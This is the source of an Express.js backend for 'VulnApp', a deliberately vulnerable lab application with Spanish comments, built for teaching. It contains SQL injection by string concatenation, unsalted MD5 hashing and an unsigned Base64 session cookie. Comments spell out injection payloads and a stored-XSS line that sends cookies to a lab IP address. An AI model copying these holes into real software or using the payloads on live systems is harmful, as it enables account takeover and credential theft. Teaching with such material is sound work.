/**
 * VulnApp - Versión VULNERABLE
 * ============================================================
 * ADVERTENCIA: Este código es DELIBERADAMENTE INSEGURO.
 * Diseñado exclusivamente para fines educativos en ciberseguridad.
 * NO DESPLEGAR en entornos de producción bajo ninguna circunstancia.
 * 
 * Vulnerabilidades implementadas (OWASP Top 10 2025):
 *   - A05:2025 Inyección (CWE-89, CWE-79, CWE-116)
 *   - A04:2025 Fallas Criptográficas (CWE-327, CWE-759, CWE-916, CWE-345, CWE-311)
 * ============================================================
 */

const express = require('express');
const crypto  = require('crypto');
const path    = require('path');
const fs      = require('fs');

// ─── Base de datos: better-sqlite3 ─────────────────────────────────────────
const Database = require('better-sqlite3');
const db = new Database('./vulnapp.db');

// ─── Inicialización del esquema (inseguro por diseño) ──────────────────────
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT    NOT NULL UNIQUE,
    password TEXT    NOT NULL,
    role     TEXT    NOT NULL DEFAULT 'user',
    email    TEXT
  );

  CREATE TABLE IF NOT EXISTS messages (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    sender_id  INTEGER NOT NULL,
    receiver_id INTEGER NOT NULL,
    content    TEXT    NOT NULL,
    created_at TEXT    DEFAULT (datetime('now'))
  );
`);

// ─── Seed de usuarios de prueba ─────────────────────────────────────────────
// FALLA CRIPTOGRÁFICA: MD5 sin salt (CWE-327, CWE-759, CWE-916)
function md5(str) {
  return crypto.createHash('md5').update(str).digest('hex');
}

const seedUsers = [
  { username: 'admin',  password: md5('admin123'),  role: 'admin', email: 'admin@vulnapp.local' },
  { username: 'alice',  password: md5('password1'), role: 'user',  email: 'alice@vulnapp.local' },
  { username: 'bob',    password: md5('qwerty'),    role: 'user',  email: 'bob@vulnapp.local'   },
  { username: 'carlos', password: md5('carlos2024'), role: 'user', email: 'carlos@vulnapp.local'},
];

const insertUser = db.prepare(`
  INSERT OR IGNORE INTO users (username, password, role, email) VALUES (?, ?, ?, ?)
`);

for (const u of seedUsers) {
  insertUser.run(u.username, u.password, u.role, u.email);
}

// ─── Aplicación Express ─────────────────────────────────────────────────────
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ─── Middleware de sesión (INSEGURO: cookie Base64 sin firma HMAC) ──────────
// FALLA CRIPTOGRÁFICA: CWE-345, CWE-311
// El servidor confía ciegamente en el contenido de la cookie sin verificación.
function getSession(req) {
  const cookieHeader = req.headers['cookie'] || '';
  const match = cookieHeader.match(/session=([^;]+)/);
  if (!match) return null;
  try {
    // Base64 decode – cualquier cliente puede modificar esto
    const decoded = Buffer.from(match[1], 'base64').toString('utf8');
    return JSON.parse(decoded);
  } catch {
    return null;
  }
}

// ─── ENDPOINT: POST /api/register ───────────────────────────────────────────
// FALLA: MD5 sin salt (CWE-916, CWE-759)
app.post('/api/register', (req, res) => {
  const { username, password, email } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Usuario y contraseña requeridos' });
  }

  // FALLA CRIPTOGRÁFICA: se aplica MD5 directamente sin salt
  const hashedPassword = md5(password);

  // FALLA DE INYECCIÓN SQL: concatenación directa (CWE-89)
  // Esta ruta usa sentencia preparada sólo para el INSERT, pero el SELECT usa concatenación
  try {
    const checkQuery = `SELECT id FROM users WHERE username = '${username}'`;
    const existing = db.prepare(checkQuery).get();
    if (existing) {
      return res.status(409).json({ error: 'El usuario ya existe' });
    }
    db.prepare('INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)').run(
      username, hashedPassword, email || '', 'user'
    );
    res.json({ message: 'Usuario registrado exitosamente' });
  } catch (err) {
    // FALLA: Exposición de información interna en errores (A10:2025 informativo)
    res.status(500).json({ error: err.message });
  }
});

// ─── ENDPOINT: POST /api/login ───────────────────────────────────────────────
// FALLA PRINCIPAL: Inyección SQL (CWE-89) + Cookie Base64 sin firma (CWE-345)
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // FALLA DE INYECCIÓN SQL: concatenación directa en la query → CWE-89
  // Payload de explotación:  ' OR '1'='1'--
  const query = `
    SELECT id, username, role, email, password
    FROM users
    WHERE username = '${username}'
    AND   password = '${md5(password)}'
  `;

  let user;
  try {
    user = db.prepare(query).get();
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }

  if (!user) {
    return res.status(401).json({ error: 'Credenciales inválidas' });
  }

  // FALLA CRIPTOGRÁFICA: sesión en Base64 plano, sin firma HMAC (CWE-345, CWE-311)
  // Payload de manipulación: decodificar, cambiar role a "admin", re-codificar
  const sessionPayload = JSON.stringify({ userId: user.id, username: user.username, role: user.role });
  const sessionCookie  = Buffer.from(sessionPayload).toString('base64');

  res.setHeader('Set-Cookie', `session=${sessionCookie}; Path=/; HttpOnly=false`);
  res.json({ message: 'Autenticado', userId: user.id, role: user.role });
});

// ─── ENDPOINT: GET /api/profile ──────────────────────────────────────────────
// FALLA: El servidor lee la cookie Base64 y confía ciegamente (CWE-345)
// FALLA: Si role=admin en la cookie, expone todos los usuarios y sus hashes
app.get('/api/profile', (req, res) => {
  const session = getSession(req);
  if (!session) {
    return res.status(401).json({ error: 'No autenticado' });
  }

  // FALLA: Confianza ciega en el rol que viene de la cookie sin verificar en BD
  if (session.role === 'admin') {
    // FALLA: Exposición íntegra de la BD incluyendo hashes de contraseñas
    const allUsers = db.prepare('SELECT id, username, password, role, email FROM users').all();
    return res.json({ admin: true, users: allUsers });
  }

  const user = db.prepare('SELECT id, username, role, email FROM users WHERE id = ?').get(session.userId);
  res.json({ user });
});

// ─── ENDPOINT: GET /api/users/:id ────────────────────────────────────────────
// FALLA DE INYECCIÓN SQL: parámetro de ruta concatenado directamente (CWE-89)
// Payload: /api/users/1 UNION SELECT username,password,role,email,id FROM users--
app.get('/api/users/:id', (req, res) => {
  const session = getSession(req);
  if (!session) return res.status(401).json({ error: 'No autenticado' });

  const { id } = req.params;

  // FALLA: el parámetro 'id' se inserta directamente sin validación de tipo
  const query = `SELECT id, username, role, email FROM users WHERE id = ${id}`;

  try {
    // Para UNION-Based SQLi, el atacante puede hacer:
    //   /api/users/0 UNION SELECT username,password,role,email FROM users--
    const user = db.prepare(query).get();
    res.json({ user });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── ENDPOINT: POST /api/search ──────────────────────────────────────────────
// FALLA DE INYECCIÓN SQL: campo de búsqueda concatenado (CWE-89)
// Payload UNION-Based: ' UNION SELECT username,password,role,email,id FROM users--
app.post('/api/search', (req, res) => {
  const session = getSession(req);
  if (!session) return res.status(401).json({ error: 'No autenticado' });

  const { query: searchTerm } = req.body;

  // FALLA: concatenación directa → permite UNION SELECT y extracción de sqlite_master
  const sqlQuery = `
    SELECT id, username, email
    FROM users
    WHERE username LIKE '%${searchTerm}%'
  `;

  try {
    const results = db.prepare(sqlQuery).all();
    res.json({ results });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── ENDPOINT: POST /api/message ─────────────────────────────────────────────
// FALLA: Stored XSS (CWE-79) — el contenido se almacena sin sanitización
// Payload XSS Worm: <script>fetch('http://192.168.56.10:8888/?c='+document.cookie)</script>
app.post('/api/message', (req, res) => {
  const session = getSession(req);
  if (!session) return res.status(401).json({ error: 'No autenticado' });

  const { receiverId, content } = req.body;

  if (!content || !receiverId) {
    return res.status(400).json({ error: 'Faltan campos' });
  }

  // FALLA: el contenido se inserta tal cual en la BD, sin sanitización (CWE-79)
  db.prepare(`
    INSERT INTO messages (sender_id, receiver_id, content)
    VALUES (?, ?, ?)
  `).run(session.userId, receiverId, content);

  res.json({ message: 'Mensaje enviado' });
});

// ─── ENDPOINT: GET /api/messages ─────────────────────────────────────────────
// FALLA: Los mensajes se devuelven crudos; el frontend los renderiza con innerHTML (CWE-116)
app.get('/api/messages', (req, res) => {
  const session = getSession(req);
  if (!session) return res.status(401).json({ error: 'No autenticado' });

  const msgs = db.prepare(`
    SELECT m.id, m.content, m.created_at,
           u.username AS sender
    FROM messages m
    JOIN users u ON u.id = m.sender_id
    WHERE m.receiver_id = ?
    ORDER BY m.created_at DESC
  `).all(session.userId);

  res.json({ messages: msgs });
});

// ─── Inicia el servidor ──────────────────────────────────────────────────────
const PORT = process.env.PORT || 4000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[VulnApp VULNERABLE] Backend corriendo en http://0.0.0.0:${PORT}`);
  console.log('ADVERTENCIA: Este servidor es deliberadamente inseguro. Solo para uso en laboratorio.');
});
